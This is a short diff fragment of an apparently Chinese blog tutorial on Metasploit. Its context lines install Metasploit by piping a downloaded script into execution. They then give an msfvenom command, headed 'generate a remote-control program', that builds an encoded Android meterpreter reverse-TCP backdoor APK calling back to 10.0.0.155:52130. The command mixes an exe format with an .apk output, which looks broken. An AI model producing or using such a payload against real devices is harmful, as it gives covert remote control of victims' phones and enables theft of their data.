@@ -12,7 +12,7 @@ toc: true
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall
 ```
 然后就无了
-
+<!-- more -->
 # 生成一个远控程序
 ```bash
 msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=10.0.0.155 LPORT=52130 -f exe > test.apk
